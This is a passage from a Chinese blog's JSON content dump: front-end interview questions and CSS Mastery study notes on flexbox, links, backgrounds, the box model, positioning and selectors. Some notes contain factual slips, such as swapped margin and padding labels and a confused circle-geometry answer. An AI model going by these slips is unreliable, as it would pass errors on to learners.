小明目前是淘宝某开发团队的实习生，今天的任务是负责用PHP编写一个动态页面，小明很快完成了代码，并附上了详细的注释。过了几天，他收到一封来自淘宝安全的邮件，邮件中说他写的代码存在安全问题。小明很纳闷，他不明白自己开发的代码为什么会有安全问题。各位同学，你能帮他看一下究竟在哪些地方存在什么样的安全问题吗？另外有哪些方法可以防范？","categories":[{"name":"interview","slug":"interview","permalink":"https://github.com/xmoyKING/categories/interview/"}],"tags":[{"name":"interview","slug":"interview","permalink":"https://github.com/xmoyKING/tags/interview/"}]},{"title":"前端面试题-1-各大公司前端面试题集","slug":"fe-interview-train-day1","date":"2017-02-11T02:10:56.000Z","updated":"2017-02-10T16:00:00.000Z","comments":true,"path":"2017/02/11/fe-interview-train-day1/","link":"","permalink":"https://github.com/xmoyKING/2017/02/11/fe-interview-train-day1/","excerpt":"","text":"2017年年初前端面试总结 80% 应聘者都不及格的 JS 面试题 from 奇虎360Web前端开发工程师面试题 alert(1&amp;&amp;2);的输出是什么？ 错误：弹出true 弹出 2 正则表达式匹配，开头为11N，12N或1NNN，后面7-8个数字的电话号码 写出下面代码的输出值： 1234567891011var obj = &#123; a: 1, b: function () &#123;console.log(this.a)&#125;&#125;;var a = 2;var objb = obj.b;obj.b();objb();obj.b.call(window); 输出 1 2 2 写出下列代码的输出值： 12345678910111213141516171819function A() &#123;&#125;function B(a) &#123; this.a = a;&#125;function C(a) &#123; if (a) &#123; this.a = a; &#125;&#125;A.prototype.a = 1;B.prototype.a = 1;C.prototype.a = 1;console.log(new A());console.log(new B());console.log(new C(2)); 错误：输出三个[object] ![题目4输出结果][1.png] 分辨对象本身属性以及其原型链上的属性 写出下列代码的输出值： 1234567891011var a = 1;function b() &#123; var a = 2; function c() &#123; console.log(a); &#125; return c;&#125;b()(); 错误：输出 1 输出 2， 因为闭包，第一个b()执行输出内部的函数c，然后第二个()执行c函数，而此时的执行环境还是b内，所以输出2 HTML&amp;CSS 写出下列代码在各个浏览器中的颜色值? 1234background: red;_background: green;*background: blue;background: black\\9; 1234567style&#123; /* css hack系列 */color:#000000; /* FF,OP支持 */color:#0000FF\\9; /* 所有浏览器IE浏览器(ie6+)支持 ；但是IE8不能识别“*”和“_”的css hack；所以我们可以这样写hack */[color:#000000;color:#00FF00; /* SF,CH支持 */*color:#FFFF00; /* IE7支持 */_color:#FF0000; /* IE6支持 */&#125; 添加些css让其水平垂直居中。 123&lt;div style=\"____________________________\"&gt; 颜海镜&lt;/div&gt; centering-in-the-unknown 最佳方案：使用css3的弹性盒模型即可快速设置匿名，同时需要给定一个高度：display:flex;align-items: center;justify-content:center;height: 500px; 使用表格显示模式：123456789101112131415&lt;div class=\"something-semantic\"&gt; &lt;div class=\"something-else-semantic\"&gt; Unknown stuff to be centered. &lt;/div&gt;&lt;/div&gt;.something-semantic &#123; display: table; width: 100%;&#125;.something-else-semantic &#123; display: table-cell; text-align: center; vertical-align: middle;&#125; 如下代码，在空白处填写代码，使其点击时，前景色为白色，背景色为黑色。 &lt;div onclick=&quot;_________________&quot;&gt;颜海镜&lt;/div&gt; 前景色：color:#fff,背景色：background-color:#000; this.style.color=&#39;#fff&#39;;this.style.backgroundColor=&#39;#000&#39;; 书写代码，点击时从1分钟开始，每秒递减到0。 &lt;div onclick=&quot;test();&quot;&gt;颜海镜&lt;/div&gt; 123456789function test()&#123; /* 无法多次点击，否则会出现多个计时器 */ var _self = this; _self.innerHTML = '1分钟'; var s = 59; var timer = setInterval(function()&#123; if(s&gt;=0)_self.innerHTML = s--; else clearInterval(timer); &#125;,1000); &#125; 简述在IE下mouseover和mouseenter的区别？ 不论鼠标指针穿过被选元素或其子元素，都会触发 mouseover 事件。对应mouseout 只有在鼠标指针穿过被选元素时，才会触发 mouseenter 事件。对应mouseleave 为什么 [ ] 是 false 而 !![ ] 是 true 已知圆心(x,y)，求圆上任一点(x1,y1)的坐标 利用圆的方程，圆的方程：（x-x1)^2+(y-x2)^2=r^2把其中的一个x，y化成x2,y2就是切线方程(x2-x1)(x-x1)+(y2-y1)(y-y1)=r^2 随机抛五枚硬币，求三枚及以上朝上的概率","categories":[{"name":"interview","slug":"interview","permalink":"https://github.com/xmoyKING/categories/interview/"}],"tags":[{"name":"interview","slug":"interview","permalink":"https://github.com/xmoyKING/tags/interview/"}]},{"title":"精通CSS笔记-Roma-Italia","slug":"roma-italia","date":"2017-02-10T01:47:36.000Z","updated":"2017-02-09T16:00:00.000Z","comments":true,"path":"2017/02/10/roma-italia/","link":"","permalink":"https://github.com/xmoyKING/2017/02/10/roma-italia/","excerpt":"","text":"学习内容： 1080布局和网格 高级CSS2和CSS3特性 字体链接和更好的Web排版 用Ajax和jQuery增加交互 1080布局和网格960像素是理想的宽度，对于800x600以上的分辨率，960是一个相当神奇的数字，可以被2，3，4，5，6，8，10，12，15和16整除，为分割网格提供多种选择。而1080除了不能被16整除，其他都可以。 网格包含行，列，外边距，隔离带，流水线和其他部分。网格主要用于垂直分割。 高级CSS2和CSS3特性 相邻同胞选择器 属性选择器 box-shadow opacity RGBa content 多栏 text-overflow 多背景 @font-face min-/max-width和height PNG图像中的alpha透明度 标点符号悬挂标点符号悬挂把标点符号放到文本块的外边，从而避免影响文本的视觉连贯性。![标点符号悬挂][./1.png] HTML使用实体&amp;ldquo; &amp;rsquo; &amp;rdquo; 表示引号。CSS代码使用text-indent: -.3em;实现 123#featurettel p &#123; text-indent: -.3em;&#125; 多栏文本布局使用colume-count: 2; colume-gap: 20px;设置多栏，colume-rule: 1px solide #ccc;可以设置栏之间的边框。 @font-face@font-face能让字体显示HTML文本，而不需要考虑用户的机器上是否安装了这种字体，通常称为字体链接或字体嵌入，而不用在文档开头使用123body &#123; font-family: xxxx;&#125; 可以这样使用@font-face12345678@font-face &#123; font-family: \"Xxxx font name\"; /* 这里的名称可以自定义 */ src: url(xxx/xxxx.otf);&#125;/* 然后在其他地方使用font-family引用即可 */h1 &#123; font-family: \"Xxxx font name\";&#125; Cufon可以当做sIFR和@font-face之间的过渡手段，使用程序如下： 下载Cufon脚本文件 使用Cufon生成器上传所选字体，然后得到第二个脚本文件 在文档头添加对Cufon脚本和生成器脚本的引用 最后在body标签结束前添加如下代码，防止IE闪烁。&lt;script type=&quot;text/javascript&quot;&gt;Cufon.now();&lt;/script&gt;在文档头中指定那些HTML元素或选择器应替换为你选择的字体： 12345&lt;script type=\"text/javascript\"&gt;Cufon.replace('h1')('h2')('p');/* 支持使用jQuery等库的选择器 */Cufon.replace('#header h2, #header ul a');&lt;/script&gt; Cufon替换的文本也可以在CSS中修改","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"}]},{"title":"精通CSS笔记-布局","slug":"layout","date":"2017-01-30T11:59:54.000Z","updated":"2017-12-06T14:50:09.368Z","comments":true,"path":"2017/01/30/layout/","link":"","permalink":"https://github.com/xmoyKING/2017/01/30/layout/","excerpt":"","text":"学习内容： 水平居中 两列和三列基于浮动的布局 2-col-fixed.html 3-col-elastic.html 3-col-fixed.html 3-col-liquid.html faux-2-col-fixed.html faux-3-col-fixed.html faux-3-col-liquid.html 固定宽度、流式和弹性布局 高度相等的列 CSS框架和CSS系统 liquid-images.htmlcss3-columns.html CSS Flexbox 弹性布局参考自：Flex 布局教程：语法篇 Flex也有行内元素和块级元素的区别：display:flex, display: inline-flex, 同时设置flex后，子元素的float、clear、vertical-align属性无效 设置为flex的元素称为容器container，子元素为项目item，有水平轴和垂直轴的区分 在容器上可以设置6个属性： flex-direction: 决定item的排列方向，属性值可以有： row（默认 水平排列） row-reverse（倒转水平排列） column（垂直排列） column-reverse （倒转垂直排列） flex-wrap：决定如何换行，属性值可以有： nowrap（默认 不换行） wrap （换行 从上到下） wrap-reverse （换行 从下到上） flex-flow：是flex-direction和flex-wrap的简写，默认为row nowrap justify-content：决定项目在水平轴上的对齐方式,类似word中的对其方式，属性值可以有： flex-start（以水平排列为例：左对齐） flex-end（右对齐） center（居中对齐） space-between （两端对其，左右边缘item不空） space-around（两端对其，左右边缘item空，即item中的间隔为两边间隔的两倍）; align-items：决定项目在垂直轴上的对齐方式，属性值可以有： stretch（默认 拉伸为容器高度，item之间不存在对齐问题） flex-start(顶对齐) flex-end （底部对齐） center（垂直居中） baseline（按第一行文字的基线对齐） align-content：决定多个轴线的对齐方式（即item排成在多行的情况），属性值可以有： stretch（默认 拉伸为轴线高度，item行之间不存在对齐问题） flex-start（以水平排列为例：左对齐） flex-end（右对齐） center（居中对齐） space-between （两端对其，左右边缘item不空） space-around（两端对其，左右边缘item空，即item中的间隔为两边间隔的两倍）; item项目可以设置的6个属性 order：决定item的排序顺序，数字越小，越靠前，默认为0，类似z-index flex-grow：决定item的放大比例，默认为0，若所有的item的grow值都相等，则均分剩余空间（注意此处），否则按照最小值为基数等比方法 flex-shrink：决定item的缩小比例，默认为1，负值无效，当空间不足时，等比例缩小，越大缩小比例越大，基数为最大的数 flex-basis：决定item占据的水平轴空间，默认为auto（item的原始大小） flex：是grow、shrink和basis的简写，默认值为0 1 auto，单个快捷值auto表示1 1 auto，none表示0 0 auto，建议用flex代替三个分离的属性，因为浏览器能推算相关的值 align-self：决定当前item的对齐方式，可以不同于其他item，即该值会覆盖align-items的值，默认为auto，表示继承父元素align-items属性，若没有父元素则等同于stretch 具体布局实例参考：Flex 布局教程：实例篇 学习flexbox布局的游戏,可以帮助快速熟悉：flexboxfroggy","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"},{"name":"layout","slug":"layout","permalink":"https://github.com/xmoyKING/tags/layout/"}]},{"title":"精通CSS笔记-表单和表格","slug":"form-table","date":"2017-01-30T11:57:02.000Z","updated":"2017-01-29T16:00:00.000Z","comments":true,"path":"2017/01/30/form-table/","link":"","permalink":"https://github.com/xmoyKING/2017/01/30/form-table/","excerpt":"","text":"学习内容： 有吸引力且可访问的数据表格 简单或复杂的表单 对表单元素应用样式 提供可访问的表单反馈","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"}]},{"title":"精通CSS笔记-列表样式和导航条","slug":"ul-nav","date":"2017-01-30T02:24:29.000Z","updated":"2017-01-29T16:00:00.000Z","comments":true,"path":"2017/01/30/ul-nav/","link":"","permalink":"https://github.com/xmoyKING/2017/01/30/ul-nav/","excerpt":"","text":"学习内容如下： 用CSS对列表应用样式 垂直/水平导航栏 pagination-nav.html vertical-nav.html horizontal-nav.html 滑动门标签页式导航 sliding-doors-nav.html 纯CSS下拉菜单 dropdowns.html CSS图像映射 imagemap.html flickr-rollovers.html 远距离翻转 remote-rollovers.html 使用定义列表 simple-list.html","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"}]},{"title":"精通CSS笔记-对链接应用样式","slug":"css-on-anchor","date":"2017-01-29T07:01:35.000Z","updated":"2017-01-28T16:00:00.000Z","comments":true,"path":"2017/01/29/css-on-anchor/","link":"","permalink":"https://github.com/xmoyKING/2017/01/29/css-on-anchor/","excerpt":"","text":"学习内容： 基于层叠对链接选择器进行排序 创建应用了样式的链接下划线 使用属性选择器对外部链接应用样式 使链接表现的像按钮 创建已访问链接样式 创建纯CSS的工具提示（tooltips） 简单链接样式:active动态伪类选择器作用于被激活的元素，对链接来说，激活发生即链接被单击时。:focus伪类能提高页面的可访问性，通过键盘移动到链接上。由于层叠，在链接上应用伪类的时候，选择器的次序非常重要，如下的次序若反过来，则样式失效。12a:link, a:visited &#123;text-decoration: none;&#125;a:hover, a:focus, a:active &#123;text-decoration: underline;&#125; 具体原因为：当两个规则具有相同的特殊性时，后定义的规则优先。即:link和:visited样式将覆盖:hover和:active次序最好如下：a:link, a:visited, a:hover, a:focus, a:active 下划线样式可以选择使用边框替代下划线，也可以选择使用图片应用到下划线，某些浏览器可以用动态gif。对于已经访问的链接，可以在链接旁边添加一个复选框：1234a:visited &#123; padding-right: 20px; background: url(/img/check.gif) no-repeat right middle;&#125; 区别对待站内的链接和外站的链接，比如使用一个小图标标识出外站链接可以使用属性选择器a[href^=&quot;http:&quot;]将所有以http:开头的链接设置上外链背景图片。改进用户在站点的浏览体验：将所有链接的类型都分类，加上相应的小图标以突出。 类似按钮的链接添加display:block; height; width;...等属性就可以创建需要的样式和点击区域，将行内元素转化为块级元素。将宽度的单位用em，可以保证在窄的地方不用担心链接宽度。使用line-height控制按钮高度，能够使按钮中的文本垂直居中。若使用height控制高度，则需要使用内边距将为文本压低模拟垂直居中的效果，但line-height有一个缺点，就是若按钮的文本太长，占了两行的话，则按钮的高度需要为文本的两倍。同时，链接应该只用于GET请求，而不要用于POST请求。 按钮翻转：实际上就是在不同的伪类状态下使用不用的背景图片，模拟翻转的效果，此时可以使用CSS Spirit 减少图片http求情。 纯CSS的tooltips当鼠标悬停在具有提示的链接或文本上时，会弹出小文本框进行提示。注意： 绝对定位元素是相对于最近的已定位的祖先元素（若没有，则是根元素）123456789101112131415161718192021222324&lt;style&gt;a.tooltip &#123; position: relative;&#125;a.tooltip span &#123; display: none; position: absolute; top: 1em; left: 2em;&#125;a.tooltip:hover span, a.tooltip:focus span &#123; display: block; position: absolute; top: 1em; left: 2em; padding: .2em .6em; border: 1px solid #ccc; background-color: #ffff66; color: #000;&#125;&lt;/style&gt;&lt;p&gt;&lt;a href=\"#\" class=\"tooltip\"&gt;Andy Budd&lt;span&gt;(This website rocks)&lt;/span&gt;&lt;/a&gt; is a web developer&lt;/p&gt; a.tooltip{position:relative}a.tooltip span{display:none;position:absolute;top:1em;left:2em}a.tooltip:focus span,a.tooltip:hover span{display:block;position:absolute;top:1em;left:2em;padding:.2em .6em;border:1px solid #ccc;background-color:#ff6;color:#000}Andy Budd(This website rocks) is a web developer","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"}]},{"title":"精通CSS笔记-背景图片","slug":"css-background-image","date":"2017-01-29T03:16:26.000Z","updated":"2017-01-28T16:00:00.000Z","comments":true,"path":"2017/01/29/css-background-image/","link":"","permalink":"https://github.com/xmoyKING/2017/01/29/css-background-image/","excerpt":"","text":"学习目标： 固定宽度和可变宽度的圆角框 滑动门技术 多个背景图片和border-radius属性 CSS投影 不透明度和RGBa 让PNG适用与IE老版本 视差滚动 背景替换 CSS背景图片基础可以利用背景图片将图片从HTML标签中分离出来，即在HTML为图像创建一个“钩子”，然后使用CSS设置图片为背景图片。例如：在HTML中添加一个空的div并且设置ID为branding，然后将这个div的尺寸设置为与站点图像相同，设置不重复，作为背景应用到网页中。123456#branding &#123; width: 700px; height: 200px; background-image: url(/img/branding.gif); background-repeat: no-repeat;&#125; 固定高度渐变背景+背景色：需要一个很高但很窄(1-2像素)的渐变图像，然后将这个图像用于与页面的主体并让其水平平铺，但由于高度固定，所以若页面内容长度超过图像高度，则渐变会突然中止。此时可以添加一个背景色，背景图片总是在背景色上，当图片结束时，颜色就会显示出来了。若背景色和渐变结束的颜色相同，则图像和颜色转换就看不出来了。12345body &#123; background-image: url(/img/gradient.gif); background-repeat: repeat-x; /* 指定水平平铺 */ background-color: #ccc; /* 此颜色为gif的结束颜色 */&#125; 设置背景图片的位置，将背景图片当作标题/条目的图片符号：123456h1 &#123; padding-left: 30px; background-image: url(/img/bullet.gif); background-repeat: no-repeat; background-position: left center; /* 图片定位于元素左边并且垂直居中 */&#125; background-position除了使用关键字,也可以使用像素或百分比作为单位，但两者有区别。若使用像素设置背景位置，那么图片左上角到元素左上角的距离为指定的像素值。若使用百分比，则使用图像的对应点与左上角进行定位。 注： 不要将像素或百分比等单位与关键字混合使用，现代浏览器会故意忽略这种写法，某些浏览器可能报错。 CSS background属性的简写版本,同时设置所有属性：background: #ccc url(/img/bullet.gif) no-repeat left center; 圆角框注: 由于CSS3标准的实现，圆角框的实现已经很方便，除非是作为HACK兼容老版本的浏览器，否则大可不必如此麻烦。固定宽度的圆角框：需要两个图片，一个用于框顶，一个用于框底。123456789101112131415161718192021&lt;style&gt;/* 将顶图用于标题，底图用于div框底部 *//* 在div中添加内边距，隔离内容区域 */.box &#123; width: 418px; background: #ccc url(/img/bottom.gif) no-repeat left bottom; padding-bottom: 1px;&#125;.box h2 &#123; background: url(/img/top.gif) no-repeat left top; margin-top: 0; padding: 20px 20px 0 20px;&#125;.box p &#123; padding: 0 20px;&#125;&lt;/style&gt;&lt;div class=\"box\"&gt; &lt;h2&gt;headline&lt;/h2&gt; &lt;p&gt;content&lt;/p&gt;&lt;/div&gt; 灵活圆角框（滑动门技术）：不用一个图像组成顶部或底部，而是用两个相互重叠的图像，随着框尺寸的增加，大图像由更多的部分显露出来，这样就实现了框扩展的效果。因为一个图像在另一个图像上滑动，将一部分图像隐藏了起来，所以也称为滑动门技术(sliding doors technique)&gt;需要在标记中添加两个额外的无意义元素，需要四个图像，底部图像的高度必须与框的最大高度相同。1234567891011121314151617181920212223242526272829303132&lt;div class=\"box\"&gt; &lt;div class=\"box-outer\"&gt; &lt;div class=\"box-inner\"&gt; &lt;h2&gt;headline&lt;/h2&gt; &lt;p&gt;content&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;style&gt;/* 弹性布局和流式布局的主要原则之一： *//* 使用em为单位设置宽度，在浏览器中增加文本尺寸时框会扩展 *//* 使用百分比设置宽度，可以使框根据浏览器窗口的尺寸适应 */.box &#123; width: 20em; background: #ccc url(/img/bottom-left.gif) no-repeat left bottom;&#125;.box-outer &#123; background: #ccc url(/img/bottom-right.gif) no-repeat right bottom; padding-bottom: 1em;&#125;.box-inner &#123; background: url(/img/top-left.gif) no-repeat left top;&#125;.box h2 &#123; background: url(/img/top-right.gif) no-repeat right top; padding-top: 1em;&#125;.box p &#123; padding-left: 1em; padding-right: 1em;&#125;&lt;/style&gt; 多个背景图片前面的圆角框例子可以使用CSS3的多背景图片方式实现。1234567891011121314151617181920&lt;style&gt;.box &#123; background-image: url(/img/top-left.gif), url(/img/top-rightt.gif), url(/img/bottom-left.gif), url(/img/bottom-right.gif); background-repeat: no-repeat, no-repeat, no-repeat, no-repeat; background-position: top left, top right, bottom left, bottom right; &#125;&lt;/style&gt;&lt;div class=\"box\"&gt; &lt;h2&gt;headline&lt;/h2&gt; &lt;p&gt;content&lt;/p&gt;&lt;/div&gt; border-radius &amp; border-imageborder-radius在书中没有特别给出什么tipsborder-image属性能给元素的边框添加背景图片。将图片划分为九宫格的方式，自适应的对应到边框上。具体请看如下w3cschool的示例： 投影（阴影）简单的CSS投影：在div中显示的图片设置为背景图片，然后内套一个img将阴影图片使用负外边距偏移即可实现，或将阴影图片使用相对定位偏移图像。 CSS3支持的box-shadow属性能更加简单的设置阴影。box-shadow: 3px 3px 6px #666;分别表示垂直和水平的偏移，投影的宽度（模糊程度），颜色。 不透明度CSS实现的opacity属性的问题是，除了对背景生效之外，对应用的元素的内容也会继承不透明度的属性值。因此可以透过警告信息的文本看到页面上的文本，而且，若不透明度太低时，警告文本本身就看不清楚了。RGBa可以解决此问题，分别设置颜色的红蓝绿值（0-255）和不透明度（0-1） 视差滚动调整浏览器窗口的大小时，背景图像会以不同的速度滚动，让人觉得这个页面由深度，这种现象叫视差滚动，许多老式计算机游戏使用此技术。参考链接：视“差”滚动浅析- 前端技术- 腾讯ISUX 图像替换为了展示某些浏览器没有的字体，使用css的方式，在文本之上使用图片替代，但是这种方式由缺陷，而且目前由于css字体的发展，目前此技术比较少见。","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"}]},{"title":"精通CSS笔记-盒模型&定位&浮动","slug":"float-position-box","date":"2017-01-28T08:31:48.000Z","updated":"2017-01-27T16:00:00.000Z","comments":true,"path":"2017/01/28/float-position-box/","link":"","permalink":"https://github.com/xmoyKING/2017/01/28/float-position-box/","excerpt":"","text":"最重要的三个css概念：浮动，定位，盒模型。他们控制在页面上安排和显示元素的方式，形成基本的布局。 主要学习如下几点： 盒模型的复杂性和特点 如何以及为什么使用外边距叠加 绝对定位和相对定位之间的差异 浮动和清理是如何工作的 CSS盒模型 在元素上添加背景，背景会应用与内容和内边距组成的区域 内边距magin使内容周围由一个隔离带 添加边框border会在内边距的区域外加一条线 外边框padding是透明的，一半控制元素之间的间隔 CSS 2.1的轮廓outline绘制在元素框上，不影响元素大小和定位 使用*{margin:0;padding:0;}对option这样的元素不友好,应该用全局reset设置内外边距 height和width是指内容区域的高和宽，内外边距和边框不会影响内容区域的尺寸，但会增加元素框的总尺寸 外边框可以为负值，内边框不能为负值 早期IE版本（6以下）有自己的盒模型，比标准的小 外边距会相互叠加，上面元素的底外边距会吞噬下面元素的顶外边距 空元素的外边距会自动叠加，且能发生多次叠加，即多个空段落只占一行的原因 只有普通文档流中块框的垂直外边距才会发生叠加。行内框、浮动框或绝对定位框之间不会叠加 使用display属性改变生成的框的类型，block可以让行内元素（strong，span，a）表现为块级元素，none使元素没有框，即不再显示，不占用文档空间 行内框在一行中水平排列，修改行内框尺寸的唯一方法是修改行高、水平边框、内外边距。而设置宽、高，垂直内外边距无效。 display属性设置为inline-block可以让元素像行内元素一样水平的依次排列，但框的内容任符合块级框的行为，如能设置宽、高，垂直内外边距。 匿名块框：将一些文本添加到一个块级元素（如div）的开头时，这些文本会被当作块级元素对待： 1234&lt;div&gt;some text&lt;p&gt;other text&lt;/p&gt;&lt;/div&gt; 匿名行框：块级元素内的文本行也会发生类似的情况，假设有一个包含3行文本的段落，则每行文本形成一个匿名行框 无法直接对匿名块或行框应用样式，除非使用:first-line伪元素 定位 相对定位 若对一个元素进行相对定位，它将出现在它所在的位置上（未设置top或left等属性时）， 然后，通过设置垂直或水平位置，可以让这个元素”相对与“它的起点移动， 若设置top:20, left：20，它将相对在原位置顶部向下移动20像素，同时右移20像素（即在左边创建20像素的空间） 注: 使用相对定位时，无论是否移动，元素仍占据原来的空间，因此，移动元素会导致它覆盖其他框 123456789101112131415161718192021&lt;div style=\"padding: 5px; width: 200px; height: 50px;\" class=\"test\"&gt; &lt;div class=\"test\"&gt;&lt;/div&gt; &lt;div id=\"d1\" class=\"test\"&gt;&lt;/div&gt; &lt;div class=\"test\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;style&gt;div.test &#123; width: 20px; height: 20px; border: 1px solid #000; margin: 5px; display: inline-block;&#125;#d1 &#123; border-color: red; position: relative; top: 10px; left: 30px;&#125;&lt;/style&gt; EXAMPLE: div.test{width:20px;height:20px;border:1px solid #000;margin:5px;display:inline-block}#d1{border-color:red;position:relative;top:10px;left:30px} 相对定位模型图： 绝对定位 相对定位实际上为普通流定位模型的一部分，而绝对定位使元素的位置与文档流无关，因此不占据空间。普通文档流中其他元素的布局就像绝对定位的元素不存在一样。 绝对定位的元素的位置是相对与距离它最近的那个已定位的祖先元素确定的，若没有已定位的祖先元素，则相对于初始包含块，可能是画布或html元素 固定定位 固定定位是绝对定位的一种，固定元素的包含块是视口，所以总是出现在窗口中相同位置的浮动元素 如屏幕右下角的”回到页顶“的按钮就采用固定定位 浮动浮动的框可以左右移动，直到它的外边缘碰到包含框或另外一个浮动框的边缘。浮动框不在文档的普通流中。 若包含块太窄，无法容纳水平排列的3个浮动元素，那么其他浮动块向下移动，直到有足够空间的地方。 若浮动元素的高度不同，那么当他们向下移动时可能会被其他浮动元素”卡住“。 行框和清理若浮动的元素后面有一个文档流中的元素，那么这个元素的框会表现得像浮动根本不存在一样。当时，框的文本内容会受到浮动元素的影响，会移动以留出空间。即：浮动元素旁边的行框被缩短，从而给浮动元素留出空间，因此行框围绕浮动框。（创建浮动框使文本可以为围绕图像） 要想阻止行框围绕在浮动框的外边，需要对包含这些行框的元素应用clear属性（值可以是left，right，both或none），对元素进行清理实际上为前面的浮动元素留出了垂直空间。clear让周围的元素为浮动元素留出空间。 overflow属性值为hidden或auto的时候，会自动清理包含的任何浮动元素，这种方法不用添加无意义的标签，但并不适用所有情况，因为设置overflow属性会在某些情况下产生滚动条或截断内容。 使用动态添加清理元素的方式，css配合javascrip，常常需要添加clear的类名 1234&lt;div class=\"news clear\"&gt; &lt;img src=\"xx\" alt=\"xx\"&gt; &lt;p&gt;&lt;/p&gt;&lt;/div&gt; 仅使用css的方法，结合伪类:after和内容声明，在指定的现有内容的末尾添加新的内容。如下实例中，添加一个点（比较小）将height设置为0，visibility设置为hidden可使新内容不占据垂直空间且不在页面上显示因为被清理元素在它们的顶外边距上添加了空间，所以生成的内容需要将它的display属性设置为block 1234567.clear:after &#123; content: \".\"; height: 0; visibility: hidden; display: block; clear: both;&#125;","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"}]},{"title":"精通CSS笔记-CSS代码结构和选择器","slug":"css-structure-selector","date":"2017-01-28T03:04:43.000Z","updated":"2017-01-27T16:00:00.000Z","comments":true,"path":"2017/01/28/css-structure-selector/","link":"","permalink":"https://github.com/xmoyKING/2017/01/28/css-structure-selector/","excerpt":"","text":"CSS Mastery结构 标签意义的重要性 有意义的页面更容易处理 程序和其他设备也可以理解有意义的标签，比如搜索引擎 可以简便的将元素调整为所需的样式，不需要添加其他标识符，避免了不必要的代码膨胀 ID和类名 一个ID只能应用于页面上的一个元素（可以内嵌其他更多元素） 类适合标识内容的类型和其他相识的条目 不要过度使用或滥用类，更不要在每个地方都添加类，因为在文档中添加了无意义的代码 为元素命名 在分配ID和类名时，尽可能保持名称与表现方式无关，如类名red这类会混乱且不易修改类名 应该根据‘是什么’来命名而不应该根据‘外观如何’来命名。能使代码更有意义，避免代码和设计不同步 类名和ID区分大小写，所以需要使用统一的命名约定，建议多个单词之间用连字符分隔，例如andy-budd比andyBudd清晰 div和span div代表部分‘divsion’，将文档分割为几个有意义的区域，所以，将主要内容包围在div中并分配content类，可以在文档中添加结构和意义 应该只在没有现有元素能够实现区域分割的情况下使用div元素。如果使用主导航列表，就不需包围在div中，完全可以删除div，直接在列表上应用类 1234567&lt;div class=\"nav\"&gt; &lt;ul&gt; &lt;li&gt;home&lt;/li&gt; &lt;li&gt;about&lt;/li&gt; &lt;li&gt;contact&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; 应该用div根据条目的意义或功能（而不是表现方式或布局）对相关条目进行分组 div可以对块级元素分组，而span可以对行内元素进行分组或标识1&lt;p&gt;Published on &lt;span class=\"date\"&gt;Feb 22nd, 2017&lt;/span&gt; by &lt;span class=\"author\"&gt;KING&lt;/spa&gt;&lt;/p&gt; 微格式 由于HTML中缺少相应的元素，很难突出显示人、地点或日期等类型信息。为了解决这个问题，开发一套标准的命名约定和标记模式来表示这些数据。这些命名约定基于vCard或iCalendar等现有的数据格式，称为微格式’microformat‘ 微格式让我们可以用一种特定的方式标记数据，让程序和服务可以访问它。 DOCTYPE DTD（文档类型定义）是一组机器可读的规则，定义XML或HTML的特定版本中允许有什么，不允许有什么。在解析网页时，浏览器使用DTD检查页面的有效性 浏览器通过分析页面的DOCTYPE声明来确定使用哪个DTD，从而知道HTML的版本 DOCTYPE通常需要指定DTD文件的URL，但HTML5不需要指定URL 浏览器一般不读取这些文件，而是仅仅识别常见的DOCTYPE声明 选择器 常用选择器 也叫元素选择器或简单选择器 后代选择器用来寻找特定元素或元素组的后代 结合类型（元素）、后代、ID和类可以找到绝大多数元素 伪类，链接伪类（:link和:visited）只能用于锚元素（a标签）；动态伪类（:hover 、 :active和:focus）理论上可以用于任何元素 通过伪类连接，可以创建更复杂的行为 1a:visited:hover &#123;color:red;&#125; *为通用选择器，作用就像通配符，匹配所有可用的元素。与其他选择器结合的时候，可以用来对某个元素的所有后代应用样式，或者跳过一级后代 高级选择器 子选择器，只选择元素的直接后代，即子元素；后代选择器选择一个元素的所有后代。 1#nav&gt;li &#123;padding-left:20px;&#125; 可以使用通用选择器模拟子选择器的效果，先在所有后代上应用预期样式，然后使用通用样式覆盖子元素的后台上的样式 12#nav li 